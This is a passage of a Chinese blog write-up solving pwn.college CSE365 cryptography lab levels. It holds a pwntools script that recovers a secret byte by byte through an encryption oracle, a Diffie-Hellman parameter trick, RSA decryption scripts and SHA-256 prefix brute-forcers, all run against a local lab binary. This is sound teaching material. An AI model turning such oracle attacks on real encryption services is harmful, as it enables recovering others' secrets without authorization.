2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br></pre></td></tr></tbody></table></figure>
<p>发现得到的十六进制密文是相同的，以此类推能够推断出所有字符。推理过程如下（X是未知字符）：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAp  wn.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAApw  n.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnv  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6u  lJVxhfCLLdZrJnv<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnvtIPk91D.ddzNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure>
<p>这里用到了<code>pwntools</code>工具来编写脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set architecture, os and log level</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>, log_level=<span class="string">"info"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the ELF file and execute it as a new process.</span></span><br><span class="line">challenge_path = <span class="string">"/challenge/run"</span></span><br><span class="line">p = process(challenge_path)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">6</span>):  <span class="comment"># 用于获取不同段的字符串</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        payload = base64.b64encode(<span class="string">b'A'</span>*j) + <span class="string">b'\n'</span></span><br><span class="line">        p.sendafter(<span class="string">b"plaintext prefix (b64): "</span>, payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        string = p.recvline()</span><br><span class="line">        <span class="comment">#print("string:" + string.split()[2].decode())</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload_1 = base64.b64encode(<span class="string">b'A'</span>*j+flag.encode()+<span class="built_in">chr</span>(i).encode()) + <span class="string">b'\n'</span></span><br><span class="line">            p.sendafter(<span class="string">"plaintext prefix (b64): "</span>, payload_1)</span><br><span class="line">            p.recvline() <span class="comment"># 注意这里获取的是密文的base64编码</span></span><br><span class="line">            string_1 = p.recvline()  <span class="comment"># 获取密文的十六进制字符串</span></span><br><span class="line">            <span class="comment">#print("string_1:"+string_1.split()[2].decode())</span></span><br><span class="line">            <span class="keyword">if</span> string_1.split()[k].decode() == string.split()[k].decode(): <span class="comment"># 用split得到对应字符串</span></span><br><span class="line">                flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"flag is: <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：Diffie-Hellman
密钥交换技术（原理见上），填入B的值得到base64编码的密文</p>
<p>wp：这题卡了很久，最后还是靠着非预期得到了flag。一开始我是将B的值设为与A相同，没有得到正确flag，然后尝试将B的值设为与p值相同，得到密文，解码竟然得到了flag，但这不是正确的解题思路</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">g: 0x2</span><br><span class="line">A: 0xfa0b8116dec4ecacf9ef4caff2749e29a4945759b62e7c41a91c3c03583154a3f8a1744c07d130d1b2b395274c575054cef6aa73d86227d9061c14451b815f7796c4a8640eab5daf0c3e689ab3e439b6658e5db3d75070fab9d805bcbbb13da12319a79498007de2b95c7be9a2b0fa85d112094cc80c92a8d98fefb2f6f004bf29066d42745e39b02f64beca200e8b30525f7049ac9e4b090df91ed5eb4d346278cd7956250344f689d43a04074f1da36a8d4846c17a5659c754ddd792320d4e13e8ed93b713633d21e253af41331c27a201d13819ddbda3353ce55d5297534f308e70155370edd6a01e098ee16f8c1a45f9a5a989436c374286373655c73c8a</span><br><span class="line">B: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">secret ciphertext (b64): cHduLmNvbGxlZ2V7VUdoLVplcDVqY2YxN0FQNS1wa3MtU1Z1d0VyLmRoek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：通过RSA的公钥和私钥解密</p>
<p>wp：运行challenge，给出了<code>e</code>,<code>d</code>,<code>n</code>以及密文，根据RSA算法通过<code>pow(密文, d, n)</code>能够得到答案，但是运行脚本得不到结果，后来看到discord上有人提示使用<code>less /challenge/run</code>能够查看挑战源码，发现第七关代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level7</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">256</span></span><br><span class="line">    ciphertext = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag, <span class="string">"little"</span>), key.e, key.n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>)</span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line">    show_b64(<span class="string">"secret ciphertext"</span>, ciphertext)</span><br></pre></td></tr></tbody></table></figure>
<p>其中<code>int.from_bytes()</code>以及<code>to_bytes()</code>函数一般默认以大端序将字节解释为整数，而源码中用到的是小端序，因此wp脚本中也该使用小端序，代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_m = <span class="string">"VbWfMzwMhfVxTxPBD/WLAWRiAtR8g1Y+YuJdf2xqdENvDHO4v2QM5kkEJVYZLt+eXCNGiIGy/WiHo9blLlqRKb7SPXUef0rdoZaQ5ZeG2WRtzbPWWdrugnWoXKu60xzjTBQ0qdvclmXZyFnbUaU+vj9HykULn0vwHC/s3e2PUgeE8FyBvxoX6sVFzauPyenv+2NyqCZDoz96xAEJeKAVKhDrV8lbxTSyPT6y7V174dO1+EGl0gpGBGJTfFfCYdD/6YLhTHi0K3owEdjm2FB6eWiZBFDyT7K/VBin33cBqpuyemAVztJaO90V+HkbGIve98RZd9sNjx1U6olzehmbPA=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">d = <span class="number">0x545652bb7b4478a66b726fefb48a45826e51c8475446d91b2c3ffde600a22f384648f503fd67a907d6d1c76b3666741526093de8652b5c45b9656b4e665f6d34cd61ed89a488513ca138f952a04ce0e719e6cbe9a5d11f29d8b7d0ca541fa6e8efce584d6551cbba0b775cac43db97cdfbfb1a3a5a7318a7e19d3f3705837c1933450044c5c69c910c3657bf1f587e7c6285568e4854d10b2c086c6745e60dede8daa52c5c556a3933eb395918f3f8d03c26ae0e9359d1d78c40b5c2201efe503575a6ae30b940ceb44e1197c423321bb5b934ddc61034da3991f088334f3abb779ee4c00b3d689701159d51e8227175d9b8571b267581a4d6157e556a2c09a1</span></span><br><span class="line">n = <span class="number">0xee7d0787f9a314b5ba76e4301f09eb765db7421c6a8d01590b85cfd1536bb7d4c2c66bc63c0aacd742d2d32a20899d82a1574316be8fb37c65371ad145b2a13a87197b6670c73e5a83e7e762a2c45d895a8da0ebf5b10dfeac55a5016139d3618b1508590c462cd839cec7ed45a1c0a87847a5653b7168d623948df709ecc0f70df58b4ed8120faa259bdbb669feea6c7befb6ec22fd8252b2650fea4d8081a862c040528a0d28aea3c55dfb033089df51fdb12b6ac60fe04b18a28d072c6da7a712f91625f118fc49af2f1764fb56075f8608e3dccfd2ea4d2d8270c0595aa1346ccb0a8442ce29d2e034bd1125550634bb843b95b6ce837c74b8bc714b43f9</span></span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8：RSA算法给定<code>e</code>、<code>p</code>、<code>q</code>以及密文，求解明文</p>
<p>WP：关键是利用<strong>扩展欧几里得算法</strong>计算求出<code>d</code>的值，私钥指数
d 是公钥指数 e 的模 ϕ(n)（即<code>(p-1)*(q-1)</code>）
的乘法逆元，具体实现如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br></pre></td></tr></tbody></table></figure>
<p>完成代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line">secret_m = <span class="string">"82JbqdZh5kV/6Rpq3EthtJSjxZkYrfj7+qKdkzarL/8hi+dVndN3iDyto+UuAws1KbXyUGMWXATiOwvbGPtLJDJmyURj1ER6jEGJQtDt9g+NsZRzN21UDCTLkplTtZo1ZyPYTSPUiOMoPSYBU+pfZ5vwZRlQBhbq5Pb5vIoqeoBkUn/OTa2MEnXKV7/wUcT1wjnYIXQloqghy16YViQ8RveEW7md6S1LlNb4nLmJOESRAHvl6YENOJQ1pTNOEaccNmggEoWTdv3cCLBXxvt7wH4hsUMhEI1l5zFK7dWz5X4f0AsNf0B2kfAaJ53rB9w7ADGzNIF8MHO6o6LvYhTLkg=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">p = <span class="number">0xb967abff3506c59500ae51ed28156e32528ddc3e87b1e01c95e8e5f6b724cbaf08f537cf3279134d886e8f5a3b8165dbcbe64bff248ba120b4628a962e8696d0971e122c09a2093eb08d13dc4cc2254b0cc682522e3f225f13e23c921c330fbb5200038f4e7f9083d699d52c2723ace20f8ab1e1ed0c161fc76e8098372ea753</span></span><br><span class="line">q = <span class="number">0xd39d2fef4307fce60af097d6d1ca15bc8256e83f537bb534b1f264222758015ac9cece15a56213e1170ae98250bf3aad5fd44b23b810e2093d252c272ec14e7460ef06dc3e463521d5e58a7ed54cb60cef6b655fae51f4d544998f152373c72a5a933dce5e3f325586b6f2c06d71247994b186fa253663795ef1792792236375</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * q</span><br><span class="line">x = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, x)</span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：要求找到一个与给定密文相同的哈希前缀（<strong>哈希前缀碰撞</strong>），注意要求输入base64编码</p>
<p>WP：由于只需要匹配前两个字节即16位，因此可以暴力求解</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_sha = <span class="string">"1Hk="</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret_hash_prefix</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 生成随机数据（也可以是序列数据，逐个尝试）</span></span><br><span class="line">        data = random.randbytes(<span class="number">16</span>)  <span class="comment"># 随机生成 16 字节数据</span></span><br><span class="line">        hash_value = sha256(data)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 比较前两个字节</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == secret_hash_prefix:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设我们已经知道 secret_hash_prefix 是通过前面的代码获得的</span></span><br><span class="line">secret_hash_prefix = base64.b64decode(secret_sha)[:<span class="number">2</span>]<span class="comment">#sha256(b'secret_flag')[:2]  # 替换为真实的秘密哈希前缀</span></span><br><span class="line">collision_data = find_collision(secret_hash_prefix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的碰撞数据: <span class="subst">{collision_data}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(collision_data))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：给定一个base64编码，要求你再添加一段base64编码在末尾使得完整的数据经过hash后，前两个字节是null</p>
<p>WP：null字节的十六进制为<code>\x00</code>，这题依旧是暴力求解，这里我先假设添加到末尾的数据是数字而不包含字母，没想到成功了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Base64 decode the challenge data</span></span><br><span class="line">challenge_b64 = <span class="string">"cD4QncA+h/LdarOt1oxo3KZ4xGrN0aTFZ+SUbxNK9X4="</span></span><br><span class="line">challenge_data = base64.b64decode(challenge_b64)</span><br><span class="line"><span class="comment"># Step 2: Bruteforce to find the correct response data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_response</span>(<span class="params">challenge_data</span>):</span><br><span class="line">    response = <span class="number">0</span>  <span class="comment"># Start from 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Convert the response data to bytes and append it to the challenge data</span></span><br><span class="line">        response_data = <span class="built_in">str</span>(response).encode() <span class="comment"># 将response_data转换为字符串方便编码</span></span><br><span class="line">        data = challenge_data + response_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Compute SHA256 hash of the concatenated data</span></span><br><span class="line">        hash_value = hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the first two bytes of the hash are null bytes (0x00 0x00)</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == <span class="string">b'\x00\x00'</span>:</span><br><span class="line">        	<span class="built_in">print</span>(hash_value)</span><br><span class="line">        	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        response += <span class="number">1</span>  <span class="comment"># Increment response and try again</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Run the bruteforce function</span></span><br><span class="line">response_data = find_response(challenge_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的 response data 是: <span class="subst">{response_data}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>得到明文，然后经过base64编码后输入终端得到flag</p></li>
<li><p>level11：通过RSA的公钥和私钥和密文求出明文</p>
<p>WP：查看源码，发现challenge是经过公钥加密过的密文</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level11</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will complete an RSA challenge-response.</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line"></span><br><span class="line">    challenge = <span class="built_in">int</span>.from_bytes(get_random_bytes(<span class="number">256</span>), <span class="string">"little"</span>) % key.n</span><br><span class="line">    show_hex(<span class="string">"challenge"</span>, challenge)</span><br><span class="line"></span><br><span class="line">    response = input_hex(<span class="string">"response"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(response, key.e, key.n) == challenge:</span><br><span class="line">        show(<span class="string">"flag"</span>, flag.decode())</span><br></pre></td></tr></tbody></table></figure>
<p>因此可以根据私钥逆向求出明文</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0xc177fb1ea71d946c909123a4ec45cd845d67bf5dd88730832cf5eabce7d5402bc3d4f95d5c7d7b198191b21d9dc138a293005ed68f955d608c95257557aa82ddc3477fb151acac90ff86cfcc9f9a0b197601457505ae9f25db50a62e26937319905e4a268dfdfbebf89ad07a59311eb00e791841f063165c2c107ffbec38f741b6a679ec96fe1f9a247b8428391e3ab5721750b1686e73d6d5835c52f9cfbb50853c2699741061a57b8a88bcdb20db9324386c8c97bbca564febdc353158eabab2334423733f38ef7dfe95edbb1bf195f0440edd81f87143c2f29be9431b0cc3012b7b8cbe7deff92abb858a8d4ec62fe056b2d1633aaf93622780610625a451</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">0x26a10bb97f99a6e0946efe64782ea9cde38e8b05b46dadd08b4220d80e1c24bf784f06694f45d8b5eb8a893b639bc870a19461db4a7902d77bca6ddbc3a0ce9773ddcb4fbee490e234bb18b39d2c7749e2a7775459c9978a4a038ce2cb1e06cdd467173c227ed375b6c2469d1f40f1052b269fa2ceda22054e610f04e09231400b0da57b4d6be1eda7bfd6b16329a53ac93be634b509b07eae1a732faf13873401ed400bad1a3b69dfc78854e8c930bfcf2c1199b30b56341be8a35aa5e5feab42711d102263cb9951e60f7b8b4b9559616ed88972c353e7dd7772cd6d66b52b94449c0471ad9f7444259dbaef117895e13870ccebff30cf29502482f2c422ff</span></span><br><span class="line">challenge = <span class="number">0x253f10636b285fd622841c813fdaf012cc23380388f78c6da0e1671d784046dc576c1efcfd60e9286e563fb54ea595a1e083fff430bf58fdaa428d01da75b4109f735cd21b88619bc4d4a79698e9c33599fd7968232b1c0e33f2b23a4800d78d265d7eccc19bc6835087942664d147474ff6b4a30766ba6ff2e122176a3ef866c60f94731f54d867f7ebff089d6517bfb96d9246569880a290f1da2567b4b5cc2c8f96785783f13b6b346b6f10e18aa2fe0d461d3bceb286014acb31bb6f698fc25e80b26cbfa48dd105f1632e6fc62ad255363b26c3c0a8dcd8cc6da27cc2b83ab75aaac9ae5d1189ae93547985af1e769f7f8dcfc7f77611f001e56720ca96</span></span><br><span class="line"></span><br><span class="line">response = <span class="built_in">pow</span>(challenge, d, n).to_bytes(<span class="number">256</span>, <span class="string">"big"</span>).<span class="built_in">hex</span>() <span class="comment">#这题与字节顺序无关</span></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：</p></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/CSE365/" rel="tag"># CSE365</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/08/29/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%92%8C%E6%B1%89%E4%BF%A1%E7%A0%81/" rel="prev" title="二维码和汉信码">
      <i class="fa fa-chevron-left"></i> 二维码和汉信码
    </a></div>
      <div class="post-nav-item">
